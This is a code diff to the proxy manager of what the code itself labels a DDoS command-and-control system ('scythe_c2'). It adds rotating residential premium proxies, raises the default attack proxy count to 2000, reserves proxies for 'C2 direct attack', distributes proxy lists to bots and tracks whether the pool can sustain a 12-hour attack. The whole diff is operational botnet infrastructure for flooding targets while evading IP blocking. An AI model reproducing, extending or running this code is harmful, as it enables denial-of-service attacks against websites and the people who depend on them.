@@ -17,6 +17,7 @@ from app.core.models import ProxyItem, ProxyStats
 from app.utils.scrapers import scrape_from_urls as smart_scrape_from_urls
 from app.utils.scrapers import scrape_from_url
 from app.utils.http_client import http_client
+from app.managers.premium_proxy_manager import premium_proxy_manager, IPRoyalConfig
 
 logger = logging.getLogger("scythe_c2.proxy")
 
@@ -31,7 +32,7 @@ MAX_ATTACK_DURATION = 43200
 HEALTH_CHECK_BATCH_SIZE = 50
 HEALTH_CHECK_TIMEOUT = 4
 
-# FIX #1: Health check test URLs - use multiple lightweight targets
+# FIX: Health check test URLs
 HEALTH_CHECK_URLS = [
     "http://www.google.com/generate_204",
     "http://www.cloudflare.com/cdn-cgi/trace",
@@ -50,7 +51,7 @@ class ProxySource:
         self.parser = parser
         self.protocol = protocol
         self.priority = priority
-        self.skip_health_check = skip_health_check  # FIX #2: Trusted sources skip health check
+        self.skip_health_check = skip_health_check
         self.last_fetch = 0
         self.last_count = 0
         self.success_rate = 1.0
@@ -197,6 +198,7 @@ class ProxyData:
     is_alive: bool = True
     speed_tier: str = "dead"
     uptime_minutes: float = 0.0
+    is_premium: bool = False  # FIX: Mark premium proxies
 
     @property
     def url(self) -> str:
@@ -241,6 +243,7 @@ class ProxyData:
             "url": self.url,
             "success_rate": self.success_rate,
             "is_fresh": self.is_fresh,
+            "is_premium": self.is_premium,
         }
 
     @classmethod
@@ -261,15 +264,17 @@ class ProxyData:
             is_alive=data.get("is_alive", True),
             speed_tier=data.get("speed_tier", "dead"),
             uptime_minutes=data.get("uptime_minutes", 0.0),
+            is_premium=data.get("is_premium", False),
         )
 
-# ========== PROXY MANAGER v8.2 — FIXED ==========
+# ========== PROXY MANAGER v8.4 — IPROYAL INTEGRATION ==========
 class ProxyManager:
     def __init__(self):
         self.sources = PROXY_SOURCES
         self.pool_key = RedisKeys.proxy_pool()
         self.alive_key = RedisKeys.proxy_alive()
         self.fast_key = RedisKeys.proxy_fast()
+        self.premium_key = f"{RedisKeys.PREFIX}proxy:premium"  # FIX: Premium proxy key
         self.last_scrap_key = RedisKeys.last_scrap()
         self._refresh_tasks = []
         self._running = False
@@ -280,6 +285,7 @@ class ProxyManager:
         self._shared_session: Optional[aiohttp.ClientSession] = None
         self._fetch_sem = asyncio.Semaphore(5)
         self._health_sem = asyncio.Semaphore(30)
+        self._premium_initialized = False
 
     async def _get_session(self) -> aiohttp.ClientSession:
         if self._shared_session is None or self._shared_session.closed:
@@ -332,6 +338,7 @@ class ProxyManager:
                             priority=source.priority,
                             last_check=0.0,
                             is_alive=True,
+                            is_premium=False,  # Scraped = not premium
                         ))
                 if len(raw_proxies) > MAX_PROXIES_PER_SOURCE:
                     logger.warning(f"[FETCH] {source.name}: Truncated from {len(raw_proxies)} to {MAX_PROXIES_PER_SOURCE}")
@@ -411,7 +418,6 @@ class ProxyManager:
 
     # ==================== MASS HEALTH CHECK ====================
     async def _check_single_proxy(self, proxy: ProxyData, test_url: str = None) -> Tuple[ProxyData, bool, float]:
-        # FIX #3: Rotate health check URLs to avoid single point of failure
         url = test_url or random.choice(HEALTH_CHECK_URLS)
         proxy_url = f"http://{proxy.ip}:{proxy.port}"
         start_time = time.time()
@@ -496,9 +502,12 @@ class ProxyManager:
         if not proxies:
             return
 
-        # FIX #4: Skip health check for trusted sources (proxies.is)
         if skip_health_check or source.skip_health_check:
             logger.info(f"[REFRESH] {source.name}: Storing {len(proxies)} proxies without health check (trusted source)")
+            now = time.time()
+            for p in proxies:
+                p.last_check = now
+                p.speed_tier = "medium"
             alive_proxies = proxies
         else:
             alive_proxies = await self._mass_health_check(proxies)
@@ -587,7 +596,15 @@ class ProxyManager:
     async def start_background_refresh(self):
         self._running = True
 
-        # FIX #5: Skip health check on initial load for fast startup (trusted sources only)
+        # FIX: Initialize IPRoyal premium sessions first
+        if not self._premium_initialized:
+            logger.info("[IPROYAL] Initializing premium residential proxy sessions...")
+            await premium_proxy_manager.initialize_sessions(count=10)
+            self._premium_initialized = True
+
+            # Health check premium
+            await premium_proxy_manager.health_check_premium()
+
         await self.refresh_all(force=True, skip_health_check=True)
 
         for src in self.sources:
@@ -600,7 +617,31 @@ class ProxyManager:
         task = asyncio.create_task(self._pool_monitor())
         self._refresh_tasks.append(task)
 
-        logger.info(f"[BG] Started: {len(self.sources)} sources + periodic + monitor")
+        # FIX: Start premium session rotator
+        task = asyncio.create_task(self._premium_rotator())
+        self._refresh_tasks.append(task)
+
+        logger.info(f"[BG] Started: {len(self.sources)} sources + periodic + monitor + premium")
+
+    async def _premium_rotator(self):
+        """FIX: Periodic premium session rotation"""
+        while self._running:
+            try:
+                await asyncio.sleep(IPRoyalConfig.SESSION_ROTATE_INTERVAL)
+                if not self._running:
+                    break
+
+                logger.info("[IPROYAL] Rotating premium sessions...")
+                await premium_proxy_manager.get_premium_proxies(count=10, rotate=True)
+
+                # Health check every 10 minutes
+                if int(time.time()) % 600 < 30:
+                    await premium_proxy_manager.health_check_premium()
+
+            except asyncio.CancelledError:
+                break
+            except Exception as e:
+                logger.error(f"[IPROYAL] Rotator error: {e}")
 
     async def _schedule_source(self, source: ProxySource):
         while self._running:
@@ -654,9 +695,26 @@ class ProxyManager:
         await self._close_session()
         logger.info("[BG] All background tasks stopped")
 
-    # ==================== DDoS PROXY SELECTION ====================
-    async def get_ddos_proxies(self, count: int = 500, min_tier: str = "medium",
+    # ==================== DDoS PROXY SELECTION — IPROYAL MIXED ====================
+    async def get_ddos_proxies(self, count: int = 2000, min_tier: str = "medium",
                                 protocols: List[str] = None) -> List[str]:
+        """FIX: Get mixed proxies - 60% IPRoyal premium + 40% scraped bulk"""
+
+        # Get bulk (scraped) proxies first
+        bulk_proxies = await self._get_bulk_proxies(count=count, min_tier=min_tier, protocols=protocols)
+
+        # Get mixed: premium + bulk
+        mixed, stats = await premium_proxy_manager.get_mixed_proxies(
+            bulk_proxies=bulk_proxies,
+            total_count=count
+        )
+
+        logger.info(f"[DDOS-MIXED] Premium: {stats['premium_count']} | Bulk: {stats['bulk_count']} | Total: {len(mixed)}")
+        return mixed
+
+    async def _get_bulk_proxies(self, count: int = 2000, min_tier: str = "medium",
+                                 protocols: List[str] = None) -> List[str]:
+        """Get scraped/bulk proxies"""
         redis = await get_redis()
         tier_order = {"ultra_fast": 0, "fast": 1, "medium": 2, "slow": 3, "dead": 4}
         min_tier_val = tier_order.get(min_tier, 2)
@@ -664,7 +722,7 @@ class ProxyManager:
         all_proxies = await redis.zrange(self.alive_key, 0, -1, withscores=True)
 
         if not all_proxies:
-            logger.warning("[DDOS] Pool empty! Triggering emergency...")
+            logger.warning("[BULK] Pool empty! Triggering emergency...")
             await self.emergency_refresh()
             all_proxies = await redis.zrange(self.alive_key, 0, -1, withscores=True)
 
@@ -672,6 +730,7 @@ class ProxyManager:
             return []
 
         filtered = []
+        now = time.time()
         for key, score in all_proxies:
             proxy_json = await redis.hget(self.pool_key, key)
             if not proxy_json:
@@ -684,9 +743,11 @@ class ProxyManager:
                     continue
                 if protocols and proxy.protocol not in protocols:
                     continue
-                if time.time() - proxy.last_check > 1800:
+                if proxy.last_check == 0.0:
                     continue
-                if proxy.success_rate < 0.3:
+                if (now - proxy.last_check) > 3600:
+                    continue
+                if proxy.success_rate < 0.1:
                     continue
 
                 filtered.append(proxy)
@@ -701,36 +762,31 @@ class ProxyManager:
             await redis.hset(self.pool_key, proxy.key, json.dumps(proxy.to_dict()))
 
         urls = [p.url for p in selected]
-        logger.info(f"[DDOS] Selected {len(urls)} proxies (tier>={min_tier})")
+        logger.info(f"[BULK] Selected {len(urls)} proxies (tier>={min_tier}) from {len(all_proxies)} alive")
         return urls
 
-    async def get_fast_proxies(self, count: int = 200) -> List[str]:
+    async def get_fast_proxies(self, count: int = 500) -> List[str]:
         return await self.get_ddos_proxies(count=count, min_tier="fast")
 
-    async def get_mixed_proxies(self, count: int = 500) -> List[str]:
+    async def get_mixed_proxies(self, count: int = 2000) -> List[str]:
+        """FIX: Default to mixed (premium + bulk)"""
         return await self.get_ddos_proxies(
             count=count, min_tier="medium",
             protocols=["http", "https", "socks5"]
         )
 
-    # FIX #6: New method for direct attack proxy reservation (20% of pool)
     async def get_direct_attack_proxies(self, count: int = 500) -> List[str]:
         """Get proxies reserved for C2 direct attack (20% of pool)."""
         redis = await get_redis()
 
-        # Get total alive count
         total_alive = await redis.zcard(self.alive_key)
         if total_alive == 0:
             logger.warning("[DIRECT] No proxies available for direct attack")
             return []
 
-        # Reserve 20% of pool for direct attack, but max 500
         reserve_count = min(count, max(50, total_alive // 5))
 
-        # Get from the end of the sorted set (slower proxies, less likely to be used by bots)
         all_proxies = await redis.zrange(self.alive_key, 0, -1, withscores=True)
-
-        # Reverse to get slower proxies first (bots get fast ones, C2 gets slower ones)
         all_proxies.reverse()
 
         selected = []
@@ -750,7 +806,6 @@ class ProxyManager:
 
     async def get_proxies_for_bot(self, bot_count: int = 1, proxies_per_bot: int = 100) -> List[List[str]]:
         total_needed = bot_count * proxies_per_bot
-        # FIX #7: Get 80% of requested count to leave 20% for direct attack
         all_proxies = await self.get_mixed_proxies(count=int(total_needed * 1.25))
 
         if not all_proxies:
@@ -780,7 +835,6 @@ class ProxyManager:
 
     # ==================== PUBLIC API (FIXED) ====================
     async def get_stats(self) -> ProxyStats:
-        """FIXED: Return ProxyStats dengan fast attribute."""
         redis = await get_redis()
         total = await redis.hlen(self.pool_key)
         alive = await redis.zcard(self.alive_key)
@@ -799,7 +853,6 @@ class ProxyManager:
         return ProxyStats(total=total, alive=alive, dead=dead, fast=fast, last_scrap=dt)
 
     async def get_alive_proxies(self) -> List[ProxyItem]:
-        """FIXED: Return ProxyItem dengan protocol attribute."""
         redis = await get_redis()
         members = await redis.zrange(self.alive_key, 0, -1)
         proxies = []
@@ -923,6 +976,7 @@ class ProxyManager:
     async def get_pool_health(self) -> dict:
         stats = await self.get_stats()
         sources = await self.get_top_sources()
+        premium_stats = await premium_proxy_manager.get_stats()
 
         return {
             "total_pool": stats.total,
@@ -935,6 +989,10 @@ class ProxyManager:
             "top_sources": sources[:5],
             "can_attack_12h": stats.alive >= MIN_POOL_SIZE_FOR_ATTACK,
             "emergency_needed": stats.alive < EMERGENCY_REFRESH_THRESHOLD,
+            # FIX: Premium stats
+            "premium_active_sessions": premium_stats.get("active_sessions", 0),
+            "premium_total_requests": premium_stats.get("premium_requests", 0),
+            "premium_ratio": premium_stats.get("premium_ratio", 0),
         }
 
 # ========== SINGLETON ==========
